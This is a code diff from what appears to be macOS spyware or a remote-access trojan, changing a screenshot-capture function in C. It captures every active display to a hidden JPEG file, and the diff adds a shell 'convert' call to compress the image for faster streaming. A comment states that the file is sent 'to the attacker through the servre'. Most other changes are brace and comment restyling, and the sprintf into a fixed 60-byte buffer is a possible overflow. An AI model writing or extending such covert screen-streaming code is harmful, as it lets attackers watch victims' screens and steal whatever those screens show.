@@ -8,14 +8,12 @@ SCREENSHOT_STATUS capture_screenshot() {
 	
 	uint32_t count;
 	
-	if (CGGetActiveDisplayList(sizeof(displays)/sizeof(displays[0]), displays, &count) != kCGErrorSuccess){
-		//failed to get display list
+	if (CGGetActiveDisplayList(sizeof(displays)/sizeof(displays[0]), displays, &count) != kCGErrorSuccess) //failed to get display list
 		return CAPTURE_FAILED;
-	}
+		
 	CGRect rect = CGRectNull;
 
-	for (uint32_t i = 0; i < count; i++){
-		// if display is secondary mirror of another display, skip it
+	for (uint32_t i = 0; i < count; i++){ // if display is secondary mirror of another display, skip it
 		if (CGDisplayMirrorsDisplay(displays[i]) != kCGNullDirectDisplay)
 			continue;
 
@@ -23,22 +21,17 @@ SCREENSHOT_STATUS capture_screenshot() {
 	}
 
 	CGColorSpaceRef colorspace = CGColorSpaceCreateWithName(kCGColorSpaceGenericRGB);
-	if (!colorspace){
-		// failed to create colorspace
+	if (!colorspace) // failed to create colorspace
 		return CAPTURE_FAILED;
-	}
 	
 	CGContextRef cgcontext = CGBitmapContextCreate(NULL, CGRectGetWidth(rect), CGRectGetHeight(rect), 8, 0, colorspace,(CGBitmapInfo)kCGImageAlphaPremultipliedFirst);
 	CGColorSpaceRelease(colorspace);
-	if (!cgcontext){
-		// failed to create bitmap context
+	if (!cgcontext) // failed to create bitmap context  	
 		return CAPTURE_FAILED;
-	}
-
+	
 	CGContextClearRect(cgcontext, CGRectMake(0, 0, CGRectGetWidth(rect), CGRectGetHeight(rect)));
 
-	for (uint32_t i = 0; i < count; i++){
-		// if display is secondary mirror of another display, skip it
+	for (uint32_t i = 0; i < count; i++){ // if display is secondary mirror of another display, skip it
 		if (CGDisplayMirrorsDisplay(displays[i]) != kCGNullDirectDisplay)
 			continue;
 
@@ -54,33 +47,30 @@ SCREENSHOT_STATUS capture_screenshot() {
 
 	CGImageRef image = CGBitmapContextCreateImage(cgcontext);
 	CGContextRelease(cgcontext);
-	if (!image){
-		// failed to create image from bitmap context
+	if (!image) // failed to create image from bitmap context
 		return CAPTURE_FAILED;
-	}
+		
 	CFURLRef url = CFURLCreateWithFileSystemPath(NULL, CFSTR(SCREENSHOT_IMAGE_NAME), kCFURLPOSIXPathStyle, 0);
-	if (!url){
-		// failed to create URL
+	if (!url) // failed to create URL
 		return CAPTURE_FAILED;
-	}
 
 	CGImageDestinationRef dest = CGImageDestinationCreateWithURL(url, kUTTypeJPEG, 1, NULL);
 	
 	CFRelease(url);
-	if (!dest){
-		//failed to create image destination
+	if (!dest) //failed to create image destination
 		return CAPTURE_FAILED;
-	}
+	
 	CGImageDestinationAddImage(dest, image, NULL);
 	CGImageRelease(image);
 	
-	if (!CGImageDestinationFinalize(dest)){
-		//failed to finalize image destination
+	if (!CGImageDestinationFinalize(dest)) //failed to finalize image destination
 		return CAPTURE_FAILED;
-	}
+		
 	CFRelease(dest);
-	
-	send_file(SCREENSHOT_IMAGE_NAME, GET_SCREEN_STREAM, true);
+	char compress_screenshot[60]; 
+	sprintf(compress_screenshot, "convert -resize 70%% %s %s ", SCREENSHOT_IMAGE_NAME, SCREENSHOT_IMAGE_NAME);// exemple : convert -resize 70% .temp_screen.jpg .temp_screen.jpg
+	system(compress_screenshot); // this commend compress the screenshot in order to deliver more screenshots per second
+	send_file(SCREENSHOT_IMAGE_NAME, GET_SCREEN_STREAM, true); //  send the screenshot to the attacker through the servre
 	
 	return CAPTURE_SUCCESSFULLY;
 }
